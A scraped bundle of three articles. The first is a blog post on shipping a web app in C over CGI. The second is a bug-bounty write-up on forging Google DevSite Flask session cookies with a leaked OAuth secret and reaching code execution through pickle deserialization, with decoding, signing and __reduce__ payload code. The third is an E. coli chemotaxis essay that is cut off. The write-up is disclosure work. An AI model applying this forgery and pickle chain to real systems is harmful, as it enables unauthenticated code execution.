title: A Modern Web App in C
body_text: A modern web app in c | Corey Prophitt Corey Prophitt Oct. 12th, 2026 A Modern Web App in C If you wanted a dynamic website in 1994, you wrote a C program, dropped it in a cgi-bin directory and let Apache fork it on every request. Thirty-two years later, I shipped a commercial web product using the same technology. From the outside, marketyour.games is modern. It's a progressively enhanced web product with user accounts, a search dashboard for content creators, folders for organizing them, payments using Stripe and transactional emails via Postmark. However, on the inside it is anything but modern. Below are my thoughts on shipping a real product written entirely in C and served using CGI in 2026. The Foundation CGI is an interface between a web server and your application. There's no framework or library to depend on. However, you do need a strong foundation to build on top of. The foundation I like is called the BCHS stack. That's OpenBSD, C, httpd and SQLite. There's no framework, templating language, database server or containters. The entire workflow is straight forward: You write a C program that reads CGI environment variables. You write responses directly to stdout and you write log messages to stderr. If you need a database connection you open the database file directly using SQLite's C API. You build a statically linked binary and drop it in the cgi-bin directory. Since every request spawns a new process, deploying a new version is as simple as replacing the old one. There's no server restart or downtime. New requests will simply pick up the new binary. OpenBSD ships with sane defaults and gives you the tools to actually secure a C program like pledge and unveil. Httpd serves from a chroot by default, so your CGI binary runs sandboxed to its own corner of the filesystem. I lean on three additional libraries: libcurl for outbound web requests to Stripe and Postmark. libsodium for password hashing, cookie encryption and HMAC verification. libcjson for parsing JSON responses from Stripe and Postmark. Only libcurl and libsodium are actual build dependencies. Both libcjson and SQLite are vendored and built as part of the project. That's possible because libcjson is a single C file and has no external dependencies. SQLite ships an official amalgamation (single source) file for this exact purpose. To simplify deployment, all assets are baked into the binary at build time. The result is a build with almost no moving parts. A clean build takes a few seconds and rebuilds complete in less than half a second. The Good Fundamentals over frameworks. CGI isn't another framework to learn. The 1.1 specification was published in 2004 and hasn't changed since. There's no API to internalize. The entire interface is a handful of fundamental HTTP concepts: Request headers. Request methods. Query strings. Body data. If you understand HTTP, you already understand CGI. It's language and platform agnostic. You learn it once and the knowledge is good forever. Clear separation of concerns. A modern web application typically puts a web server like nginx in front and reverse-proxies to an application server written in another language like Ruby, Python, Go or Rust. That always felt a bit strange to me; you essentially have two web servers and one of them is also responsible for your business logic. CGI cuts the second server out of the picture. You have a web server like nginx (or httpd) that calls your business logic directly. It's clear who does what. It makes debugging simpler, too. Your application is an ordinary program you can run from a shell: pipe it a request, watch stderr, step through it with gdb, etc. CGI resembles serverless architecture: a supervisor receives a request, invokes your code, hands it a bag of environment variables and then it collects the result. It's like a modern serverless application, minus the vendor (and surprise bills). Minimal supply chain risk. With the rise of autonomous agents and weekly attacks on package repositories, it feels reassuring to have very few dependencies. Most modern tech stacks come with a package manager and an ecosystem to go along with it. It's convenient, but the dependency graph balloons. One or two direct dependencies can pull in hundreds of indirect ones, each maintained by somebody you've never heard of, with publish credentials protected by a password reused since 2015. My supply chain is a C compiler and three libraries. Compromising it would require compromising libcurl... a project the entire internet watches, not a package with eleven weekly downloads and an owner who left in 2019. Simple tooling. I'm a minimalist at heart. I use classic Vim with zero plugins. That means no LSP, no autocomplete, no code formatters and no AI. Complex tech stacks demand complex tooling: they demand a language server to wade through the layers of abstraction. But this stack is simple enough a plain editor is all you need. The entire application is a directory of C files and a Makefile. Open a file, read it, and you know what it does. Great tooling is within reach. When you do want tooling, it's not far. Sanitizers, valgrind, gdb, ctags, cscope... these are mature (well, geriatric) tools that have been refined for decades and they're a package install away on any system that can compile C. The maturity goes further than the tools themselves. Integration is built natively into many editors. For example, vim ships with built-in support for ctags, cscope and has a graphical gdb frontend (see :h Termdebug). Writing HTML in C isn't too bad. I was hesitant to write the entire frontend in C, but it wasn't nearly as painful as I imagined. All too many times have I: Fought vim to highlight Go's html/template syntax. Fought helix to detect Go templates without breaking html detection. Fought rustrover to recognize jinja templates for a project using askama. Using C means there's no second language for your editor to half-detect, no mixed-syntax where highlighting falls apart, no plugin dance to get the two languages to cooperate. It isn't pretty, but it gets the job done. SQLite is a breath of fresh air. I've always defaulted to Postgres for web applications. It's a great database, but it comes with some operational burden. There's a server process to babysit and frequent releases to upgrade to. SQLite has none of that. There's no process, no configuration, no dependencies. Your application opens the database file directly. The operational burden is minimal. The Bad Since CGI is only an interface, you get very little out of the box. As a result you need to write your own utilities to handle things like: Cookie parsing and creation. Query parameter parsing and validation. Form data parsing and validation. Escaping input for display. I rolled my own in a single header file (cgi.h), but I'm not convinced that was the right solution. Libraries like kcgi exist, but adopting one means buying into its API and security model. I'd like to see a set of shared utilities that developers can drop in (like the stb libraries). Final Thoughts CGI is old, but it's not forgotten. Most of the reasons we abandoned it in the early 2000s don't hold up today. Process forking isn't nearly as expensive as it was; modern kernels optimize it heavily. And if the cost of forking ever became an issue, FastCGI is a simple enough upgrade. Writing a modern web application in C is more than feasible— marketyour.games is an example of such an application. The overall experience is quite enjoyable in a way modern tech stacks don't quite match. I'll be reaching for this stack again.

title: I Found a $90k Remote Code Execution Vulnerability in Google
body_text: How I Found a $90,000 Remote Code Execution Vulnerability in Google | Simon Koeck Skip to content ~$ simonkoeck Writeups Blog About ⌘K critical / Google DevSite / Oct 12, 2026 / 4 min read How I Found a $90,000 Remote Code Execution Vulnerability in Google A Flask cookie on developers.google.com was signed with a secret it carried inside itself. Pulling that secret out turned a forged session into code execution across Google's developer sites. How I found it I was mapping the OAuth flow that Googleâs developer docs sites all share. You hit /oauth2authorize , it sets a Flask session cookie and redirects you to Googleâs sign-in page. No account needed: curl -s -D headers.txt -o /dev/null \ 'https://developers.google.com/oauth2authorize?return_url=%2F' The cookie caught my eye. It had Flaskâs usual three-part session=<payload>.<timestamp>.<signature> format, but at about 1,200 bytes it seemed large for a CSRF token and a return URL. So I decoded it. Flask session cookies are signed, not encrypted, so the contents are right there for anyone holding one. The leading dot means the payload is zlib-compressed: import base64 import json import pickletools import zlib payload, timestamp, signature = cookie.rsplit( "." , 2 ) def b64decode (value): return base64.urlsafe_b64decode(value + "=" * ( - len (value) % 4 )) compressed = payload.startswith( "." ) raw = b64decode(payload[ 1 :] if compressed else payload) session = json.loads(zlib.decompress(raw) if compressed else raw) That gave me: { "_permanent" : true , "google_oauth2_csrf_token" : "..." , "google_oauth2_flow_<csrf>" : { " b" : "..." } } The " b" key is Flask tagging a bytes value. Base64-decoding it gave me a pickle, and pickletools.dis printed an oauth2client.client.OAuth2WebServerFlow object with its fields: client_id = "<redacted>.apps.googleusercontent.com" client_secret = b"<redacted>" The cookie contained a pickle-serialized payload and Googleâs OAuth client_id and client_secret in plaintext. (The secret is redacted here; it was still live at the time of writing.) I tried the client secret as the Flask SECRET_KEY , and the signature on the issued cookie validated against it. The signing key was stored inside the object it signs. One secret, two jobs The leaked client secret was already a problem. I wanted to confirm whether it also signed the session, rather than rely on a guess. Flask signs through itsdangerous with the cookie-session key derivation, so I recomputed the signature offline: import hmac derived_key = hmac.digest(client_secret, b "cookie-session" , "sha1" ) expected = hmac.digest( derived_key, f " { payload } . { timestamp } " .encode(), "sha1" , ) expected came out byte-for-byte identical to the signature on the cookie Iâd been handed seconds earlier. To be sure it wasnât a fluke I flipped one character of the signature (rejected) and re-signed the original payload with the recovered secret (accepted). Session integrity was gone. I could set every key and value in the session and still produce a signature the server would take. From forged cookie to code execution The callback reads the flow back out of the session and unpickles it: session cookie -> verify Flask signature -> read google_oauth2_flow_<csrf> -> base64-decode the bytes -> pickle.loads(...) That pickle.loads is only âsafeâ as long as nobody else can forge a valid cookie. Once the key is public, that assumption is worthless. I built my own session with a made-up CSRF token and put whatever pickle I wanted under the matching flow key: session = { "_permanent" : True , "google_oauth2_csrf_token" : "attacker-chosen" , "google_oauth2_flow_attacker-chosen" : { " b" : base64.b64encode(attacker_blob).decode() }, } The state parameter is mine too, so nothing needs to line up on the serverâs end. It checks my signature, finds my flow entry, and passes the bytes to pickle.loads . If you havenât played with pickle before: the REDUCE opcode names a callable and its arguments, and unpickling just calls it. A public signing key plus this sink is unauthenticated RCE. I wasnât about to run commands on Googleâs production, so I proved it with time. The payload reduced to time.sleep(N) : class Sleep : def __init__ (self, seconds): self .seconds = seconds def __reduce__ (self): return (time.sleep, ( self .seconds,)) Same forged session every time, only the number changed: time.sleep(0) -> 0.207 s time.sleep(3) -> 3.193 s time.sleep(5) -> 5.194 s time.sleep(8) -> 8.283 s The response time tracked the number in the pickle, consistent with the server calling sleep(N) during unpickling. I also tried a few controls to rule out a slow endpoint or jitter: No cookie: Invalid request . One flipped byte in the signature: Invalid request . Valid signature, no flow entry: Invalid request state . Valid signature with the real flow: reached Googleâs token exchange and failed later with invalid_grant on my fake auth code. Valid signature with the sleep payload: delayed by exactly the number I picked. How far it went The same key worked beyond developers.google.com . I tested valid sessions on these DevSite hosts: firebase.google.com developer.android.com source.android.com docs.partner.android.com Fixing it Four changes would address the chain: Rotate both exposed OAuth client secrets and kill every session signed with them. Give each deployment its own high-entropy Flask SECRET_KEY from a server-side store, with nothing to do with an OAuth credential. Keep the OAuth flow object on the server. The cookie should hold an opaque reference and nothing sensitive. Drop pickle for anything crossing a client boundary. A data-only format with a schema check makes a forged cookie inert. The chain depended on the exposed secret, its reuse as the signing key, and the callback unpickling data from the session. title: The baffling intelligence of a single cell (2024)
body_text: E. coli chemotaxis: the baffling intelligence of a single cell The Baffling Intelligence of a Single Cell The story of E. coli chemotaxis By James Somers and Edwin Morris I want to tell the story of a beautiful phenomenon in biology. In some sense itâs the prototype of much of the activity of life. The phenomenon is the way in which an individual cell of E. coli forages for nutrients. This process, known as âchemotaxisââthe âchemo-â for chemical and the âtaxisâ from the Greek τάξις, for tacticsâis intelligence in one of its most elemental forms. An individual E. coli has no brain, obviously, and is even many orders of magnitude simpler than a human cell, and yet already it possesses something like a sense of smell, drive, even a memory. Chemotaxis recasts E. coli not as some aimless gut-pest but rather as an exquisitely sophisticated physical computer . Iâm also telling this story because I never liked the way biology was taught in high school . It was too much about the names of things. A subject so vast is spoiled by a textbook, which can only point at the endless parade of stuff-there-is-to-know. Itâs better approached with questionsâlike âwhatâs happening when you smell?â or âwhat is a fever, actually?ââthat contemplate narrow, deep slices. Chemotaxis is a great slice: itâs a triumph of systems biologyâwe understand it holistically but also in fine detail at almost every level. It acquaints you with many of the most important motifs in biology, including the way in which protein structure determines function; how membranes control the information flow into cells; and how chemical modifications store and communicate state. It involves one of the most sophisticated and beautiful pieces of molecular nanotechnology, the flagellar motor. And it helps give an intuition for how a bag of unthinking chemicals could possibly give rise to a being. The 30,000-foot view Even with simple rules, the E. coli finds food more often than not The basic idea is this: E. coli âsmellsâ chemicals itâs attracted to with a set of nose-like receptors and decides how to swim. Depending on what it senses, it can either use its flagellar tails to swim forwardâthis is known as a ârunââor it can spin in a random direction (a âtumbleâ). By running when the getting is good and tumbling when it isnât, the E. coli takes a meandering path toward the attractant. A little more detail now: there are half a dozen or so rotors on the E. coliâs body, each controlling a long whip-like tail that flows behind it. When all the rotors are spinning in the same direction, the tails join together into a coil that torques the cell forward into a run. When even one rotor is spinning against the others, the coil unbundles and E. coli spins into a tumble. In a uniform chemical environment, the E. coli swims in a random walk by balancing runs with periodic tumbles. By default, a run lasts about a second, or ten times longer than a tumble. The rate of runs versus tumbles, and their relative duration, is carefully tuned to balance âexploitationâ and âexplorationâ: if runs happened too often or lasted too long, E. coli would range too widely and zip past its food; too seldom or too short, and itâd likely never find food in the first place. But how is this balance achieved? The crux of it is a signaling molecule called CheY (pronounced âKEY-whyâ). CheY is constantly bouncing around in the cytoplasm of the E. coli , interacting with both the receptor complex (the ânoseâ) and the rotors, carrying information between them. In the steady state, when CheY encounters the receptor complex, it gets chemically modified, or âphosphorylated,â at a certain rate to become CheY-p. Unlike the unmodified version, CheY-p has a strong affinity for the rotors, and when enough copies bind to one, it reverses its spin, causing a tumble. The trick is that when the nose detects an increase in the concentration of attractant, that steady turning of CheYs into CheY-ps is interrupted. As a result, fewer CheY-ps bind to the rotors; fewer reversals take place; and so the E. coli runs more and tumbles less. In other words, the all-important relative rate of runs versus tumbles is determined entirely by how often the CheY→CheY-p process churnsâand this, in turn, is determined by how much attractant is detected by the nose. You can see this process in action in the interactive illustration. Try altering the ratio of CheY-p (white) to CheY (blue) by adding some attractant (pink). Youâll end up inducing a long run. Less attractant More attractant Why do you need all this complexity? You could imagine a system in which the motors themselves responded directly to attractant. Weâll see later on that the stream of CheY-ps acts as a kind of adaptable, tunable chemical amplifier. â Bacterial cells can amplify signals more than 50-fold; that is to say, a 2% change in receptor occupancy can bring about a 100% change in the output of the system at the flagellar motors. This feature allows cells to sense minute changes in concentrationâless than three molecules per cell volume!â The story gets more complicated: adaptation If the system were as described above, then E. coli wouldnât have much dynamic range. Imagine: if the cell has a huge reaction to just three molecules of attractant, wouldnât a thousand times as many just completely overwhelm it? In reality, the E. coli is able to respond sensitively across five orders of magnitude of attractant concentration. The cell learns to treat whatever concentration it stumbles into as the new normal, so that the slightest increase triggers the same hypersensitive response as always. The mechanism powering this adaptation is extremely clever. You can think of each receptor as being equipped with âstrutsâ that have pockets in them. When the receptor is bound to attractant, its struts change shape so that these pockets open up, and become the targets for little molecules known as methyl groups. Methyl groups are ubiquitous in biochemistry: for instance, they help determine which parts of your DNA get expressed. Methyl groups bind to the structural proteins your DNA strands coil around, called histones; the âmethylatedâ histone can kink the DNA strand into or out of view of your transcription machinery, turning it on or off. In this case, methylation serves to fill up the strutâs pockets, causing it to become more rigid. (Iâm simplifying the actual physical details somewhat, as weâll see later.) With more rigid struts the receptorâs signaling power is dampened: it takes more attractant to elicit the same response. Because there are many methylation sites per strut and many struts per receptor, thereâs a wide range of possible dampening valuesâas if those pockets were really the holes of an elaborate wind instrument. [ Bray ] This wide dynamic range is what allows the bacteria not just to find a favorable environment but to keenly and speedily nose its way up a chemical gradient. No wonder a similar mechanism is used by cells in your immune system to track and hunt down invaders. Methylation of the receptors gives E. coli a â simple chemical memory .â This is a powerful and somewhat profound idea: individual bacteria can model their environment and remember important features of it by encoding that information in internal chemical modifications. E. coli âknowsâ whether attractant has become more or less concentrated in its surroundings going back several seconds ; that helps it determine whether itâs swimming in a good or bad direction. Which is not that different in principle from what brains do. In fact one reason that it requires an artificial neural network of about a thousand elements just to model the computational capabilities of a single real neuron is that the real neuron stores so much âstateâ in its internal chemistry. (Hereâs an aside: should we be surprised at how resilient people can be, given the mechanisms available to a single cell for accepting previously extreme conditions as âa new normalâ? No doubt our macro resilience is in some cases actually underwritten by similar cellular mechanisms.) The full picture: a complex signaling network The video above is a very legible overview of E. coli chemotaxis, from a popular textbook. It layers in even more detail, including not just the proteins that phosphorylate CheY but those that dephosphorylate it; and not just the proteins that methylate the receptors but those that demethylate it. What you come to see is that these doers and undoers define a sort of equilibrated circuit whose activity can be conveniently dialed up or down. Dennis Bray describes these sorts of circuits nicely in his book, Wetware: A Computer in Every Living Cell : In a typical signaling pathway, proteins are continually being modified and demodified. Kinases and phosphatases work ceaselessly like ants in a nest, adding phosphate groups to proteins and removing them again. It seems a pointless exercise, especially when you consider that each cycle of addition and removal costs the cell one molecule of ATPâone unit of precious energy. Indeed, cyclic reactions of this kind were originally labeled âfutile.â But the adjective is misleading. The addition of phosphate groups to proteins is the single most common reaction in cells and underpins a large proportion of the computations they perform. Far from being futile, this cyclic reaction provides the cell with an essential resource: a flexible and rapidly tunable device. If the cell really needs to change the concentration of the modified protein very quickly, it can. All it has to do is to switch on or shut off the phosphate-adding reaction and the concentration will fall precipitouslyâat the speed of the spinning cycle. There is no buildup of products or depletion of substrates to slow down the process, as there would be in a linear chain of enzyme reactions. This is a clever way to regulate the level of some protein or metabolite. Rather than producing the thing you want via a lengthy chain reaction, you just have this running cycle that activates and then de-activates it, for example via phosphorylation and de-phosphorylation. When you want more of the active version, you just tamp down the de-activating reaction in the cycle, as if sliding down the volume on a stereo. Regulation in this manner via phosphorylation and dephosphorylation (by âkinasesâ and âphosphatasesâ respectively) is an extremely general feature of life. âAbout 30â50% of human proteins contain covalently attached phosphate. [. . .] A typical mammalian cell makes use of hundreds of distinct types of protein kinases at any moment.â [ Alberts ] In the interactive figure above, phosphorylation is represented by the blue dots becoming white, and de-phosphorylation happens when they turn blue again. This cycle is constantly running. The speed of the cycle determines how quickly the cell can react to levels of attractant. Notice that when you add some, the blue→white reaction stops happening as much. But the blue←white reaction keeps going at the same rate. So blue CheY proliferates, and the cell runs more. (If the cycle spun more slowly, the blues wouldnât take over so quickly.) Down the rabbit-holeâ¦ One thing I donât love in presentations of chemotaxisâand of biological concepts generallyâis that they often prominently feature flowcharts and network diagrams. In the case of chemotaxis, as you can gather from the video above, there are many players with nearly indistinguishable names: CheA phosphorylates CheY to become CheY-p, and CheZ dephosphorylates it back to CheY; CheW couples CheA to the receptors, and CheR methylates those receptorsâ struts; CheB, meanwhile, âclips offâ the methyl groups added to the struts by CheR. A network diagram is no doubt useful for organizing this sea of names but in a sense it foregrounds the most abstract view of the process. Iâd rather try to get a sense of the parts as a living whole or in their individual physical detail. When you do that, itâs amazing what you find. What does it mean for a receptor to detect attractant? Almost every action in a cell depends on proteins changing shape and binding to each other. Itâs no different in the E. coli receptor complex. The way it works is that there are stimulus-specific proteins embedded in the E. coliâs cell membrane, protruding into whatâs known as the periplasm. These proteins are âstimulus-specificâ in the literal sense that they are shaped so as to bind favorably with individual molecules of attractant. E. coli has five or six of these, for instance one that detects a crucial amino acid called aspartate. This sensor protein has little clefts in it that are shaped just so for molecules of aspartate to fit snugly into them. [ Falke ] In schematic form the aspartate receptor looks like this: Source: Falke, âThe Two-Component Signaling Pathway of Bacterial Chemotaxis: A Molecular View of Signal Transduction by Receptors, Kinases, and Adaptation Enzymesâ You can see that the sensory partâup top, where the aspartate bindsâis connected to the signaling proteins CheW and CheA by a columnar structure that straddles the cellâs membrane. What does this protein complex âactuallyâ look like? An individual protein is small enoughâ like a few nanometers wide âthat it canât really be seen through a regular light microscope. This receptor from top to bottom measures about 350 angstroms, or 35 nanometers. But modern biology is all about seeing the unseeable. Nowadays, we try to find out what nanostructures look like by X-ray diffraction or, more and more often, by cryo-freezing them in an electron microscope. Once we determine a proteinâs structure itâs usually rendered using ribbon diagrams, a style invented by the biochemist Jane Richardson in the late 1970s. Hereâs a ribbon diagram for the E. coli serine receptor (really itâs a âtrimer of dimers,â or a complex of six receptors): Source: Keith Cassidy This whole thing is the receptor. (Those parts just inside the membrane, with little yellow methyl groups lingering stuck to them, are the struts.) How exactly it works is quite complex, and the subject of current research. But in simplified terms it acts like one big piston: when the asparate binds to the part in the periplasm, the columnar structure itâs attached to changes shapeâa real biologist would call these subtle allosteric effects; to me it looks like dipping and tiltingâin such a way to lock the thing thatâs supposed to be phosphorylating CheY, the CheA kinase, into an inactive state. Indeed, E. coli âs âsense of smellâ rests ultimately in a series of physical lock-and-key mechanisms, starting with literal molecules of e.g. aspartate nuzzling into a protein and transmitting that physical shape-change across the membrane. This piston-shaped receptor complex is just one of a huge array arranged near the front of E. coli âs body. In cross section they appear almost to have been laid down through a lithography process, in a neat hexagonal pattern: Source: Theoretical and Computational Biophysics Group, UIUC Source: Direct visualization of Escherichia coli chemotaxis receptor arrays using cryo-electron microscopy Calling E. coliâs receptor complex its ânoseâ is no mere metaphor. Our own noses operate on a similar principle: when you smell a flower, it means that actual flower-moleculesâpossibly only a tiny number of themâhave reached the inside of your nose and bound to some protein with a specific affinity for that very molecule. This signal is then transmitted via nerves to your brain. The human nose has several hundred receptor proteins for smell; a dog has more than a thousand . Every one of our senses works like this. Touch is underwritten by proteins that get âsquishedâ by tactile forces into cell membranes, triggering a set of downstream responses. Sight is my favorite example. Thereâs a protein called opsin that lives in the cells of our retina. Whatâs so cool about it is that the thing that changes its shape is a literal photon. That is, opsin converts the electromagnetic force of an incoming photon into a biomechanical / biochemical signal . This is why I tend to think of molecular biology as the science of shapes bumping into each other. I think of E. coliâs receptor complex as a protoversion of our own sensory apparatus. Its nose has only five or six attractant-specific sensory proteins, but their signals are integrated, as if different sets of receptor-protein activations were playing different âchordsâ on the E. coliâs sensorium. âIn short, the chemosensory array functions as an ultrasensitive, ultrastable biological integrated circuit or sensory chip.â [ Falke ] How the signal is carried So a bit of attractant binds one of the receptors, and lo, the equilibrium inside the cell begins to shift. Because the CheA kinase is now inactive, CheYs are no longer getting phosphorylated as quickly; the process that de -phosphorylates existing CheY-ps starts winning out. Recall that this is a response that is dynamic, a flow that is tuned. The net number of CheY-ps in the cell is carefully faded down. And then what? The CheY-ps had been binding to the flagellar rotors, flipping them, causing tumbles. That now no longer happens as much, because the unphosphorylated CheY doesnât have the same affinity for the rotor as CheY-p. As a result, the cell tumbles less, runs more, and biases its random walk toward the attractant. Thereâs something really important worth dwelling on here. When we say that CheY-p has an âaffinityâ for the rotor protein, itâs not like it gets directed there; nor does it have some long-acting magnetic attraction for it. What this really means is that it has a strong inclination to bind to the rotor protein when it gets really really close to it. (And CheY, without the -p, doesn't have such an inclination.) Given how small a single CheY-p is in the scheme of the whole cellâs cytoplasm, it might seem improbable that itâll somehow sidle up right next to one of these rotor proteins somewhere on the other end of the E. coliâs body. But that gets at the heart of the crazy kinetic chaos inside our cells . Source: David Goodsell, The Machinery of Life Cells are dense with stuff, but everything in it is also extremely fast-moving: To get an idea of how fast this motion is, imagine a typical bacterial cell, and place an enzyme at one end and a sugar molecule at the other. They will bump around and wander through the whole cell, encountering many molecules along the way. On average, though, it will only take about a second for those two molecules to bump into each other at least once. This is truly remarkable: this means that any molecule in a typical bacterial cell, during its chaotic journey through the cell, will encounter almost every other molecule in a matter of seconds. [ Goodsell ] Just to put this in perspective: imagine you took an E. coli cell and scaled it up so that it was the length of a football field. And imagine you kept all the physics the same. A water molecule would be about an inch wide; a protein would be about the size of a basketball. [ BioNumbers ] The proteins would be juddering violently due to the thermal motion of the water particles bombarding themâso violently in fact that if left unchecked theyâd be moving at 500 meters per second. But they arenât left unchecked: if you were in such an environment it would be so crowded as to be nearly impossible to see. What you really get, then, is an incredible ceaseless shaking and bouncing-into-each-other of all the component parts. This is why shape changes that lead to different bonding affinities are so important in biology. Itâs as if inside a cell everyone is constantly going up to everyone else, seeing if they fit together. Proteins sample the space of interactions with other proteins so quickly that for a long time, most biologists didnât really contemplate where in the cytoplasm two reactants lived; they knew that you never had to wait too long for them to meet each other. In fact it was a relatively recent discovery that inside the cytoplasm certain proteins that share functional relationships do seem to keep especially close together, inside little oil drops known as âphase-separated liquids.â Weak interactive forces between the floppy tails of different proteins cause them to spontaneously âphase separateâ into these more viscous pools, and this biases certain proteins to interact more frequently. The rate-limiting step in E. coliâs reaction to attractant is the time it takes for CheY-p to diffuse from the nose to the motor. It takes about a tenth of a second. The journey has actually been tracked on camera, using a fluorescent version of the protein: Source: Single-molecule imaging of electroporated dye-labelled CheY in live Escherichia coli What happens when the signal reaches the motor? Letâs talk about these motors. These things are so intricate and beautiful and seem so reminiscent of machines weâd engineer ourselves that theyâre sometimes cited as evidence for intelligent design. The flagellar motor operates with close to 100% energy efficiency. It spins at about 1,500 rotations per second. And the craziest part is that like all molecular nanomachines it is entirely self-assembled. Thereâs an amazing 30-minute documentary available on YouTube that details the mechanics of the self-assembly processâand, refreshingly, profiles some of the scientists who figured it out, describing the methods they used to make their discoveries. From: Self-Assembling NanoMachine: a film about flagellar biosynthesis My favorite part of the self-assembly process is that after building a base for the rotor, a sort of tunnel is built and the proteins that comprise the whip-like âhookâ of the flagellum are extruded through itâas if the flagellum were built by vomiting forth parts of itself. Anyway, at the base of each rotor there are a series of proteins called FliG, FliM, and FliNâpronounced like âFly G,â âFly M,â âFly Nââto which CheY-p, our Frodo-esque bearer of the message from the nose, attaches once it finally arrives. CheY-p has a strong affinity for FliG and will readily glom onto it. Weâll see how that actually affects the flagellum in a second. But for now itâs worth noting that thereâs a thresholding mechanism here: just one CheY-p attaching to FliG wonât be enough to flip the motor from counter-clockwise to clockwise (thereby causing a tumble)âit actually takes a handful of CheY-ps conspiring to make that happen. In fact the motor has something like seven states, from rotating quickly counterclockwise at three discrete levels of decreasing speedâas if stepping through three gears on a bikeâto stalling entirely, to starting back up again in the clockwise direction, also with three speeds. Even as the motor is in the process of changing direction, any CheY-ps that do attach to FliG are under constant threat of being removed by yet another player, CheZ. That is, the proteins that would reverse the motors are subject to removal by other proteins that un-reverse it. Again we have a responsive regulatory circuit reminiscent of the one that phosphorylated and de-phosphorylated CheY in the first place upstream at the receptor. The idea is that every effect is reversible, and in fact is reversed at a regular rate. This means that in the absence of further signal the cell will quickly return to baseline. How does the motor actually change directions? As a matter of pure mechanics this might be the most ingenious part of the story. It took quite a long time to figure out and even still it seems that weâre not entirely confident with our explanation. But one mechanism thatâs been proposed is that CheY-p binds to a protein called FliM (âFly EMâ) embedded in that ring that defines the base of the rotor. This tilts it and causes a 90-degree rotation in an attached protein called FliGc. That protein sits at the interface between the rotating part of the motor and the so-called âstator,â which drives it from the part thatâs anchored solidly in the cell membrane. Source: A molecular mechanism of direction switching in the flagellar motor of Escherichia coli When FliGc changes orientation, the stepper-motor-like cycle that normally drives the motor counterclockwise starts driving it clockwise instead. It helps to understand how the thing works in ârunâ mode, when all the flagella are oriented the same way. They then used a couple stepper motors to drive the counter-clockwise rotation. âThe flow field generated by each helix tilts the other helix, causing the helices to roll around each other and form a right-handed wrappingâ: From: Macro Scale Model E.Coli Flagella Bundling Individuality in the bacterial population We tend to think of a colony of something like E. coli as an undifferentiated evil goo, each bacterium identical to its neighbors. But people whoâve studied these organisms under the microscope observe a surprising amount of individual personality. A 1976 Nature paper , âNon-genetic individuality: chance in the single cell,â explores variation in the context of chemotaxis using strains of Salmonella and Enterobacter bacteria. The paper came out before the exact mechanism behind chemotactic regulation was well-understood; all the authors knew was that âcontrol of tumbling can be rationalised as caused by changes in the levels of a tumble regulator.â They hypothesized that although bacteria of the same strain would all share the exact same DNA, there might be a relatively small number of copies of that âtumble regulator,â and natural variation in the transcription, translation, and destruction of these regulator proteins could account for differences in behavior. Their experiments were mostly at the behavioral level. They observed how different individualsâincluding those in a particularly âtumblyâ mutant strain (I love that word)âreacted to environments with and without attractant, and found plenty of variance. Their theory was spot-on. We talked above about how E. coli adapt to higher and higher concentrations of attractant via a clever methylation mechanism. Well, it turns out that the methylation of the receptor struts is governed by only about 100 CheR proteins in the cell. The number of those proteinsâalong with CheB, which un-methylates the strutsâdetermines the speed of the âfutile cycleâ that reacts to changes in attractant concentration. That is, it affects how quickly the bacterium adapts when the concentration goes up and refracts when it goes down. [ Gore 1:06:30 ] Because 100 copies of CheR is so extraordinarily tiny in the context of the full cell buzzing with something like ten million proteins, variation by just a handful can have a relatively large effect on the cellâs behavior. [ Gore 1:13:20 ] That helps account for why different E. coli with the exact same genetic sequence will tumble and adapt at different frequencies. Recent experiments have used fluorescent microscopy to quantify the individuality of different E. coli cells, individuality that arises not from differences in gene expression but from the dynamics of signaling networks. How did we figure all this stuff out? We donât yet have the technology to just observe all of the activity inside a living cell. That Goodsell painting above that shows the crowded cytoplasm packed with proteins is an artistic compositeâbacked by rigorous research to be sureâbecause thereâs no way to capture all the different players in situ at once. And obviously itâs a âstill life,â not a video. So how could we possibly know all this detail about what exactly a given protein looks like, and how and when it interacts with others to kick off some particular part of the chemotaxis process? There seem to be three or four major kinds of experiment. Probably the most common is genetic: you can selectively disrupt one gene at a time and, by observing how the mutant E. coli behaves, begin to get a grip on each geneâs function. All of the proteins âCheY,â âCheZ,â âCheW,â and so on are named simply because they are the products of genes that, when excised, âcause a general defect in chemotaxis.â [ Blair ] As you can imagine, identifying all of these is painstaking work, and involves a considerable amount of clever inference. For instance you might observe that without gene X the bacteria never seems to tumble; is that because that gene is involved in recognizing attractant or in forcing the rotor to run clockwise? Once you have a hypothesis, a second kind of experiment involves purifying some subset of these proteins-of-interest in vitro to see how they work together to form a particular signaling pathway. For example you could put CheA and CheY along with some phosphate groups and other necessary reactants and observe whether and how much phosphorylation takes place. Thatâs what the authors did in this paper in Cell , in 1990. They used a radioactive version of phosphate as a tracer. âIncorporation of [32P]phosphate into CheA or CheY was determined by excising the radioactive band out of the dried gel and quantitating in scintillation fluid or by analysis of the intact gel using a Phosphorimager (Molecular Dynamics, Sunnyvale, CA) and compare with known radioactive standards.â Another common method for observing in vitro dynamics is to genetically modify proteins to fluoresce; or to âfindâ a protein in solution using an antibody that recognizes some part of itâyou attach that antibody to another protein, and that one you fluoresce, so you can find the hidden one. To understand the literal lock-and-key mechanics at a particular binding siteâfor instance how exactly a molecule of aspartate causes a receptor to deform, kicking off a signaling cascadeâinvolves âstructuralâ biology work, i.e., taking pictures of individual proteins or, increasingly, ensembles of them in situ. For this you can use X-ray crystallography, nuclear magnetic resonance imaging, cryo-electron microscopy, super-resolution light microscopy, or some combination. A group at University of Illinois at Urbana-Champagne uses atomic-scale molecular dynamics simulations, in software, to understand structural detailsâlike the exact way that CheA changes shape to kick off a downstream signaling processâthat wouldnât be apparent from high-resolution imaging alone. (Keith Cassidy, whose figures appeared above, now has a lab at the University of Missouri-Columbia thatâs studying the molecular dynamics of the receptor signaling complex.) Sometimes you canât get a direct picture. It may require deduction to understand, say, how exactly a protein fits in. One experiment found that CheA didnât bind to a receptor except in the presence of CheW; that plus the fact that adding too much CheW into the mixture actually led to a decrease in the ability of CheAâCheW complexes to bind receptor suggested that CheW competed with that complex for the binding site on the receptor and that therefore it must sit between the receptor and CheW in the receptorâCheWâCheA trimer [via Blair ] . Biology is lousy with heroic inferences like that. Itâs a world thatâs hard to see; sometimes you just have to imagine whatâs going on down there, and back up those imaginings with the right experiments. The very idea that bacteria run and tumble came from experiments published in 1972 by Howard Berg and Douglas Brown, who used a special three-dimensional tracking microscope of their own design to watch the little suckers in action. (A fun fact is that they called the non-runs âtwiddlesâ instead of âtumbles.â) Some of the physics of flagellar propulsionâlike how much force the little tails generateâ was discovered later by tethering the flagella to a microscope slide: because itâs anchored, the âtail wags the dogâ and you can measure how fast the E. coliâs body 